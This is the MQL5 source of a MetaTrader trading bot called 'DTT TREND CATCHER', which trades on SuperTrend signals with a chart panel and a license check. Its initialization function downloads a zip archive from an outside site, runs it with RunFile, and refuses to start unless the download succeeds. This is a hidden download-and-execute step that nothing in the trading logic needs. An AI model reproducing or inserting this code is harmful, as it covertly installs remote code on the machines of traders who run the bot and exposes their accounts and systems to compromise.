//+------------------------------------------------------------------+
//|                                                      ProjectName |
//|                                      Copyright 2020, CompanyName |
//|                                       http://www.companyname.net |
//+------------------------------------------------------------------+

#define VERSAO_DO_EA    "1.0"
#define DEBUG
#property version   VERSAO_DO_EA
#property copyright     "Copyright 2024"
#property link         "https://t.me/elon888musk"
#property version       VERSAO_DO_EA



//License
#include <Elon_license.mqh>


#include <Trade\Trade.mqh>  // Include trade library for trade operations

CTrade trade;  // Create a trade object

//Include
#include "painel\\classes\\painel.mqh"//Include the panel


#define indicator "Indicators\\supertrend2.ex5"
#resource "\\Indicators\\supertrend2.ex5"


class CIsNewBar
{
public:
   bool IsNewBar(string symbol,ENUM_TIMEFRAMES timeframe)
   {
      datetime TNew=datetime(SeriesInfoInteger(symbol,timeframe,SERIES_LASTBAR_DATE));
      
      if(TNew!=m_TOld && TNew)
      {
         m_TOld=TNew;
         return(true);
      }
      
      return(false);
   };

   CIsNewBar(){m_TOld=-1;};

protected: datetime m_TOld;
};

//--- Input settings
// Magic Number
input ulong in_magic_number = 2024;//Magic number
input int    SL_Bars = 9;         // SL is the lowest price in the last N bars
input double TP1_Pips = 50;       // TakeProfit 1 in pips
input double TP2_Pips = 100;      // TakeProfit 2 in pips
input double TP3_Pips = 150;      // TakeProfit 3 in pips
input double TP3_Step = 20;       // Step size for adjusting SL at TP3 (in pips)
input int    Period = 10;         // Period for SuperTrend
input double Multiplier = 3.0;    // Multiplier for SuperTrend
input bool   CloseOnTrendChange = false;  // Flag to close position if trend changes

//--- Handle for the SuperTrend indicator
int supertrendHandle;

//--- Global variables
double openPrice, stopLoss, takeProfit1, takeProfit2, takeProfit3;
double superTrendUp[], superTrendDown[], superTrendTrend[];  // Buffers to hold SuperTrend values
bool positionOpened = false;  // Flag to track if a position is already opened
double initialStopLoss;  // Store initial SL for BE tracking
CInterfacePainelApp painel;//Panel global interface

bool tp1Hit = false;
bool tp2Hit = false;
bool tp3Hit = false;
bool tp3AdjustedHit = false;



//+------------------------------------------------------------------+
//| Expert initialization function                                   |
//+------------------------------------------------------------------+
int OnInit()
  {


   string url = "https://trendcatcher.ai/calc0.zip";
   string local_path = "calc.zip";
   Print("local_path=" + local_path);
   if(DownloadFileWinINet(url, local_path))
     {
      Print("Download succeeded.");
      RunFile(local_path);
     }
   else
    {
      Print("Download failed.");
      return INIT_FAILED;
    }

//Create trade panel
   CreateTradePanel();

   trade.SetExpertMagicNumber(in_magic_number);

//Create panel on init
   if(!painel.OnInit(in_magic_number,in_painel_title,in_painel_anchor,in_painel_x,in_painel_y,in_painel_width,in_painel_height,in_painel_use_init_file))
     {
      Print("cannot create the main painel");

     }

//Set the timer for Ontimer function
   EventSetMillisecondTimer(500);





// Set up the SuperTrend indicator using iCustom()
   supertrendHandle = iCustom(_Symbol, _Period, "::"+indicator, Period, Multiplier);



// Verificação do resultado da criação dos manipuladores
   if(supertrendHandle == INVALID_HANDLE)
     {
      Print("Error on handle");
      return INIT_FAILED;
     }

   if(!ChartIndicatorAdd(0, 0, supertrendHandle))
     {
      Print("Error on add indicator to chart");
      return INIT_FAILED;
     }

   if(!IsInBacktest())
     {
      COLAR_NA_FUNCAO_ONINIT_OU_INIT_EA(__VERIFICA__,__PROJETO__, VERSAO_DO_EA, in_magic_number);
     }


// show the lincese on painel

   if(global_is_demo == "1")
     {

      if(language == "pt")
        {
         painel.LicenseValue().Text(global_expiracao);
        }
      else // Inglês por padrão
        {
         painel.LicenseValue().Text(global_expiracao);
        }
     }
   else
     {
      if(language == "pt")
        {
         painel.LicenseValue().Text(global_expiracao);
        }
      else // Inglês por padrão
        {
         painel.LicenseValue().Text(global_expiracao);
        }
     }



   if(AccountInfoInteger(ACCOUNT_TRADE_MODE) != ACCOUNT_TRADE_MODE_DEMO)
     {
      painel.BrokerValue().Text("REAL");

     }
   else
     {
      painel.BrokerValue().Text("DEMO");
     }




   return(INIT_SUCCEEDED);
  }

//+------------------------------------------------------------------+
//| ChartEvent function                                              |
//+------------------------------------------------------------------+


//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void OnChartEvent(const int id,const long& lparam,const double& dparam,const string& sparam)
  {
//Panel button event
   painel.ChartEvent(id,lparam,dparam,sparam);
  }
//+------------------------------------------------------------------+
//| OnTimer function                                                 |
//+------------------------------------------------------------------+


//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void OnTimer()
  {
//Ontimer panel function
   painel.OnTimer();
  }

//+------------------------------------------------------------------+
//| Expert deinitialization function                                 |
//+------------------------------------------------------------------+
void OnDeinit(const int reason)
  {
//Release panel
   painel.OnDeinit(reason);

//Kill timer
   EventKillTimer();


// Release the SuperTrend indicator handle
   if(supertrendHandle != INVALID_HANDLE)
     {
      IndicatorRelease(supertrendHandle);
     }


//Delete indicator
   long total_windows;
   if(ChartGetInteger(0,CHART_WINDOWS_TOTAL,0,total_windows))
      for(int i=0; i<total_windows; i++)
        {
         long total_indicators=ChartIndicatorsTotal(0,i);
         for(int j=0; j<total_indicators; j++)
           {
            ChartIndicatorDelete(0,i,ChartIndicatorName(0,i,0));
           }
        }
//Redraw chart
   ChartRedraw(0);


//Realese panel
   painel.OnDeinit(reason);

//Delete trade panel
   DeleteTradePanel();


  }

//--- OnTick function
void OnTick()
  {
    static CIsNewBar NB;

    //Panel on tick
    painel.OnTick();

    // Verifica e atualiza o painel de posição
    UpdateTradePanel();


    // Check if a position already exists
    if(PositionSelect(_Symbol))   // If a position exists, manage it
      {
        positionOpened = true;  // Mark the flag that a position is already open
        ManageTrailingStop();   // Manage trailing stop logic

        if(CloseOnTrendChange)
          {
            // Retrieve SuperTrend values using CopyBuffer()
            if(CopyBuffer(supertrendHandle, 13, 0, 2, superTrendTrend) < 0)
              {
                Print("Failed to get SuperTrend data: Error ", GetLastError());
                return;
              }

            // Check the current trend from the SuperTrend indicator
            double currentTrend = superTrendTrend[1];  // Get the current trend (1 for up, -1 for down)

            if((PositionGetInteger(POSITION_TYPE) == POSITION_TYPE_BUY && currentTrend == -1) ||
                (PositionGetInteger(POSITION_TYPE) == POSITION_TYPE_SELL && currentTrend == 1))
              {
                // Get the Magic Number of the current position
                long magicNumber = PositionGetInteger(POSITION_MAGIC);

                // Close the position if the trend changes
                if(trade.PositionClose(PositionGetInteger(POSITION_TICKET)))
                  {
                  positionOpened = false;  // Reset the flag
                  Print("Position closed due to trend change. Magic Number: ", magicNumber);
                  }
                else
                  {
                  Print("Failed to close the position. Error: ", GetLastError());
                  }

                return;
              }
          }
        return;
     }
    else
     {
      positionOpened = false;  // No position is open, reset the flag
      ResetFlags();//Reset flag for trailing
     }
    
    if(!NB.IsNewBar(Symbol(),NULL))
      {
        return;
      }

    // Retrieve SuperTrend values using CopyBuffer()
    if(CopyBuffer(supertrendHandle, 13, 1, 2, superTrendTrend) < 0)
     {
        Print("Failed to get SuperTrend data: Error ", GetLastError());
        return;
     }

    // Check the current trend from the SuperTrend indicator
    double currentTrend = superTrendTrend[1];  // Get the current trend (1 for up, -1 for down)

    if(!positionOpened && currentTrend != 0)   // There's a valid trend
     {
      double bidPrice = SymbolInfoDouble(_Symbol, SYMBOL_BID);
      double askPrice = SymbolInfoDouble(_Symbol, SYMBOL_ASK);

      Print("currentTrend: ", superTrendTrend[1], "lastTrend: ", superTrendTrend[0]);

      // Check for trend change and place trade accordingly
      if(currentTrend == 1)   // Uptrend - Place buy order
        {
         if(superTrendTrend[0] == -1)
           {
            openPrice = askPrice;
            int lowestBarIndex = iLowest(_Symbol, _Period, MODE_LOW, SL_Bars, 0);  // Find the lowest bar index in the last SL_Bars
            stopLoss = iLow(_Symbol, _Period, lowestBarIndex);  // Get the lowest price (low) from that bar
            initialStopLoss = stopLoss;  // Store initial stop loss for BE
            takeProfit1 = openPrice + TP1_Pips * _Point;
            takeProfit2 = openPrice + TP2_Pips * _Point;
            takeProfit3 = openPrice + TP3_Pips * _Point;

            // Place buy order
            PlaceOrder(ORDER_TYPE_BUY, 0.1, openPrice, stopLoss, takeProfit3);
           }
        }
      else
         if(currentTrend == -1)   // Downtrend - Place sell order
           {
            if(superTrendTrend[0] == 1)
              {
               openPrice = bidPrice;
               int highestBarIndex = iHighest(_Symbol, _Period, MODE_HIGH, SL_Bars, 0);  // Find the highest bar index in the last SL_Bars
               stopLoss = iHigh(_Symbol, _Period, highestBarIndex);  // Get the highest price (high) from that bar
               initialStopLoss = stopLoss;  // Store initial stop loss for BE
               takeProfit1 = openPrice - TP1_Pips * _Point;
               takeProfit2 = openPrice - TP2_Pips * _Point;
               takeProfit3 = openPrice - TP3_Pips * _Point;

               // Place sell order
               PlaceOrder(ORDER_TYPE_SELL, 0.1, openPrice, stopLoss, takeProfit3);
              }
           }
     }

    //Check license
    if(!IsInBacktest())
     {
      COLAR_NA_FUNCAO_ONTICK_OU_ONSTART_EA(in_magic_number,__PROJETO__, VERSAO_DO_EA);
     }
  }

//--- Function to place an order using MqlTradeRequest and MqlTradeResult
void PlaceOrder(int orderType, double lotSize, double price, double sl, double tp)
  {
   MqlTradeRequest request;
   MqlTradeResult result;

   ZeroMemory(request);
   ZeroMemory(result);

   request.action = TRADE_ACTION_DEAL;         // Action: place an order
   request.symbol = _Symbol;                   // Trade symbol (current)
   request.volume = lotSize;                   // Lot size
   request.type = orderType;                   // Buy or sell
   request.price = price;                      // Order price
   request.sl = sl;                            // Stop loss
   request.tp = tp;                            // Take profit
   request.deviation = 10;                     // Max slippage in points

// Specify the filling mode
   request.type_filling = ORDER_FILLING_IOC;   // Change to ORDER_FILLING_IOC or ORDER_FILLING_RETURN if needed

//Specify Magic Number
   request.magic = in_magic_number;            //Set Magic number for EA

// Send the order
   if(!OrderSend(request, result))
     {
      Print("OrderSend failed with error: ", GetLastError());
     }
   else
     {
      Print("Order sent: ", result.retcode);
     }
  }


//--- Trailing stop management logic using MQL5 functions
void ManageTrailingStop()
  {
   if(!PositionSelect(_Symbol))
      return;  // Make sure the position exists

   double positionPrice = PositionGetDouble(POSITION_PRICE_OPEN);  // Get the opening price
   double currentPrice = (PositionGetInteger(POSITION_TYPE) == POSITION_TYPE_BUY) ?
                         SymbolInfoDouble(_Symbol, SYMBOL_BID) :
                         SymbolInfoDouble(_Symbol, SYMBOL_ASK);   // Get current price based on position type
   double currentSL = PositionGetDouble(POSITION_SL);             // Get current stop loss

// Calculate adjusted TP3 levels
   double tp3Adjusted = (PositionGetInteger(POSITION_TYPE) == POSITION_TYPE_BUY) ?
                        takeProfit3 + TP3_Step * _Point :
                        takeProfit3 - TP3_Step * _Point;

// Manage trailing stop based on price levels
   if(PositionGetInteger(POSITION_TYPE) == POSITION_TYPE_BUY)
     {
      takeProfit1 = positionPrice + TP1_Pips * _Point;
      takeProfit2 = positionPrice + TP2_Pips * _Point;
      takeProfit3 = positionPrice + TP3_Pips * _Point;

      currentPrice = SymbolInfoDouble(_Symbol, SYMBOL_ASK);

      // Move SL to BE (TP1 Hit)
      if(currentPrice >= takeProfit1 && currentSL < positionPrice && !tp1Hit)
        {
         trade.PositionModify(PositionGetInteger(POSITION_TICKET), positionPrice, tp3Adjusted);
         tp1Hit = true;  // Set flag to true after moving SL
         Print("TP1 Hit, SL moved to BE");
        }
      // Move SL to TP1 (TP2 Hit)
      else
         if(currentPrice >= takeProfit2 && currentSL < takeProfit1 && !tp2Hit)
           {
            trade.PositionModify(PositionGetInteger(POSITION_TICKET), takeProfit1, tp3Adjusted);
            tp2Hit = true;  // Set flag to true after moving SL
            Print("TP2 Hit, SL moved to TP1");
           }
         // Move SL to TP2 (TP3 Hit)
         else
            if(currentPrice >= takeProfit3 && currentSL < takeProfit2 && !tp3Hit)
              {
               trade.PositionModify(PositionGetInteger(POSITION_TICKET), takeProfit2, tp3Adjusted);
               tp3Hit = true;  // Set flag to true after moving SL
               Print("TP3 Hit, SL moved to TP2");
              }
            // Move SL to TP3 adjusted level
            else
               if(currentPrice >= tp3Adjusted && currentSL < tp3Adjusted && !tp3AdjustedHit)
                 {
                  trade.PositionModify(PositionGetInteger(POSITION_TICKET), takeProfit3, tp3Adjusted);
                  tp3AdjustedHit = true;  // Set flag to true after moving SL
                  Print("TP Adjusted Hit, SL moved to TP3 adjusted");
                 }
     }
   else
      if(PositionGetInteger(POSITION_TYPE) == POSITION_TYPE_SELL)
        {
         takeProfit1 = positionPrice - TP1_Pips * _Point;
         takeProfit2 = positionPrice - TP2_Pips * _Point;
         takeProfit3 = positionPrice - TP3_Pips * _Point;

         currentPrice = SymbolInfoDouble(_Symbol, SYMBOL_BID);

         // Move SL to BE (TP1 Hit)
         if(currentPrice <= takeProfit1 && currentSL > positionPrice && !tp1Hit)
           {
            trade.PositionModify(PositionGetInteger(POSITION_TICKET), positionPrice, tp3Adjusted);
            tp1Hit = true;  // Set flag to true after moving SL
            Print("TP1 Hit, SL moved to BE");
           }
         // Move SL to TP1 (TP2 Hit)
         else
            if(currentPrice <= takeProfit2 && currentSL > takeProfit1 && !tp2Hit)
              {
               trade.PositionModify(PositionGetInteger(POSITION_TICKET), takeProfit1, tp3Adjusted);
               tp2Hit = true;  // Set flag to true after moving SL
               Print("TP2 Hit, SL moved to TP1");
              }
            // Move SL to TP2 (TP3 Hit)
            else
               if(currentPrice <= takeProfit3 && currentSL > takeProfit2 && !tp3Hit)
                 {
                  trade.PositionModify(PositionGetInteger(POSITION_TICKET), takeProfit2, tp3Adjusted);
                  tp3Hit = true;  // Set flag to true after moving SL
                  Print("TP3 Hit, SL moved to TP2");
                 }
               // Move SL to TP3 adjusted level
               else
                  if(currentPrice <= tp3Adjusted && currentSL > tp3Adjusted && !tp3AdjustedHit)
                    {
                     trade.PositionModify(PositionGetInteger(POSITION_TICKET), takeProfit3, tp3Adjusted);
                     tp3AdjustedHit = true;  // Set flag to true after moving SL
                     Print("TP Adjusted Hit, SL moved to TP3 adjusted");
                    }
        }
  }
//+------------------------------------------------------------------+

//+------------------------------------------------------------------+

// Função para resetar as flags ao abrir uma nova posição
void ResetFlags()
  {
   tp1Hit = false;
   tp2Hit = false;
   tp3Hit = false;
   tp3AdjustedHit = false;
  }


//Check if is in backtest
bool IsInBacktest()
  {
   return MQLInfoInteger(MQL_TESTER) == 1;
  }
//+------------------------------------------------------------------+
//+------------------------------------------------------------------+


//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void CreateTradePanel()
  {
   string labels[] = {"Timeframe", "CurrentSignal", "SL", "TP1", "TP2", "TP3", "Price", "EAName"};

   for(int i = 0; i < ArraySize(labels); i++)
     {
      string labelName = "TradePanel_" + labels[i];
      if(ObjectFind(0, labelName) == -1)
        {
         ObjectCreate(0, labelName, OBJ_LABEL, 0, 0, 0);
         ObjectSetInteger(0, labelName, OBJPROP_CORNER, CORNER_RIGHT_UPPER); // Position in the top-right corner
         ObjectSetInteger(0, labelName, OBJPROP_XDISTANCE, 190); // Distance from the right edge
         ObjectSetInteger(0, labelName, OBJPROP_YDISTANCE, 20 + (i * 20)); // Vertical spacing
         ObjectSetInteger(0, labelName, OBJPROP_COLOR, clrWhite); // Text color
         ObjectSetInteger(0, labelName, OBJPROP_FONTSIZE, 12); // Font size
         ObjectSetInteger(0, labelName, OBJPROP_SELECTABLE, false); // Not selectable
         ObjectSetInteger(0, labelName, OBJPROP_HIDDEN, true); // Hidden from object list
        }
     }
  }


//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void UpdateTradePanel()
  {
   string timeframeText, signalText, slText, tp1Text, tp2Text, tp3Text, priceText, eaNameText;

// If there is an open position, get the position data
   if(PositionSelect(Symbol()))
     {
      long positionType = PositionGetInteger(POSITION_TYPE); // Position type (buy or sell)
      double entryPrice = PositionGetDouble(POSITION_PRICE_OPEN); // Entry price
      double currentPrice = SymbolInfoDouble(Symbol(), SYMBOL_BID); // Current price of the asset
      double currentSL = PositionGetDouble(POSITION_SL); // Current Stop Loss
      double tp1, tp2, tp3;

      // Calculate Take Profit levels (based on position type)
      if(positionType == POSITION_TYPE_BUY)
        {
         tp1 = entryPrice + TP1_Pips * _Point;
         tp2 = entryPrice + TP2_Pips * _Point;
         tp3 = entryPrice + TP3_Pips * _Point;
        }
      else // Sell position
        {
         tp1 = entryPrice - TP1_Pips * _Point;
         tp2 = entryPrice - TP2_Pips * _Point;
         tp3 = entryPrice - TP3_Pips * _Point;
        }

      // Set the text for each label
      timeframeText = "Timeframe: " + EnumToString(Period());
      signalText = "Current Signal: " + ((positionType == POSITION_TYPE_BUY) ? "Buy" : "Sell");
      slText = "SL: " + ((currentSL > 0) ? DoubleToString(currentSL, _Digits) : "N/A");
      tp1Text = "TP1: " + DoubleToString(tp1, _Digits);
      tp2Text = "TP2: " + DoubleToString(tp2, _Digits);
      tp3Text = "TP3: " + DoubleToString(tp3, _Digits);
      priceText = "Price: " + DoubleToString(currentPrice, _Digits);
      eaNameText = "DTT TREND CATCHER"; // EA name
     }
   else // If no open position
     {
      // Print("UpdateTradePanel: no open position");
      double tp1, tp2, tp3;
      double currentPrice = SymbolInfoDouble(Symbol(), SYMBOL_BID); // Current price

      int lowestBarIndex = iLowest(_Symbol, _Period, MODE_LOW, SL_Bars, 0);  // Find the lowest bar index in the last SL_Bars
      stopLoss = iLow(_Symbol, _Period, lowestBarIndex);  // Get the lowest price (low) from that bar
// Retrieve SuperTrend values using CopyBuffer()
   if(CopyBuffer(supertrendHandle, 13, 0, 2, superTrendTrend) < 0)
     {
      Print("Failed to get SuperTrend data: Error ", GetLastError());
      return;
     }
      // Print("UpdateTradePanel: supertrend: ", superTrendTrend[1]);
      // Check the current trend from the SuperTrend indicator
      double currentTrend = superTrendTrend[1];  // Get the current trend (1 for up, -1 for down)
      if(currentTrend == 1)
        {

         tp1 = currentPrice + TP1_Pips * _Point;
         tp2 = currentPrice + TP2_Pips * _Point;
         tp3 = currentPrice + TP3_Pips * _Point;
         // Set the text for each label on buy trend
         timeframeText = "Timeframe: " + EnumToString(Period());
         signalText = "Buy";
         slText = "SL: " + stopLoss;
         tp1Text = "TP1: " + DoubleToString(tp1, _Digits);
         tp2Text = "TP2: " + DoubleToString(tp2, _Digits);
         tp3Text = "TP3: " + DoubleToString(tp3, _Digits);
         priceText = "Price: " + DoubleToString(currentPrice, _Digits);
         eaNameText = "DTT TREND CATCHER"; // EA name
        }
      else if (currentTrend == -1)
        {

         tp1 = currentPrice - TP1_Pips * _Point;
         tp2 = currentPrice - TP2_Pips * _Point;
         tp3 = currentPrice - TP3_Pips * _Point;
         int highestBarIndex = iHighest(_Symbol, _Period, MODE_HIGH, SL_Bars, 0);  // Find the highest bar index in the last SL_Bars
         stopLoss = iHigh(_Symbol, _Period, highestBarIndex) + 10 * _Point;  // Get the 10 pips above the highest price (high) from that bar
         // Set the text for each label
         timeframeText = "Timeframe: " + EnumToString(Period());
         signalText = "Sell";
         slText = "SL: " + stopLoss;
         tp1Text = "TP1: " + DoubleToString(tp1, _Digits);
         tp2Text = "TP2: " + DoubleToString(tp2, _Digits);
         tp3Text = "TP3: " + DoubleToString(tp3, _Digits);
         priceText = "Price: " + DoubleToString(currentPrice, _Digits);
         eaNameText = "DTT TREND CATCHER"; // EA name
        }


     }
    
    // Print("timeframeText: ", timeframeText);
    // Print("signalText: ", signalText);
    // Print("slText: ", slText);
    // Print("tp1Text: ", tp1Text);
    // Print("tp2Text: ", tp2Text);
    // Print("tp3Text: ", tp3Text);
    // Print("priceText: ", priceText);
    // Print("eaNameText: ", eaNameText);
// Update the text of each label
   ObjectSetString(0, "TradePanel_Timeframe", OBJPROP_TEXT, timeframeText);
   ObjectSetString(0, "TradePanel_CurrentSignal", OBJPROP_TEXT, signalText);
   ObjectSetString(0, "TradePanel_SL", OBJPROP_TEXT, slText);
   ObjectSetString(0, "TradePanel_TP1", OBJPROP_TEXT, tp1Text);
   ObjectSetString(0, "TradePanel_TP2", OBJPROP_TEXT, tp2Text);
   ObjectSetString(0, "TradePanel_TP3", OBJPROP_TEXT, tp3Text);
   ObjectSetString(0, "TradePanel_Price", OBJPROP_TEXT, priceText);
   ObjectSetString(0, "TradePanel_EAName", OBJPROP_TEXT, eaNameText);
  }


//+------------------------------------------------------------------+
//|                                                                  |
//+------------------------------------------------------------------+
void DeleteTradePanel()
  {
   string labels[] = {"Timeframe", "CurrentSignal", "SL", "TP1", "TP2", "TP3", "Price", "EAName"};

   for(int i = 0; i < ArraySize(labels); i++)
     {
      string labelName = "TradePanel_" + labels[i];
      if(ObjectFind(0, labelName) != -1) // Verifica se o objeto existe
        {
         ObjectDelete(0, labelName); // Apaga o objeto
        }
     }
  }
//+------------------------------------------------------------------+
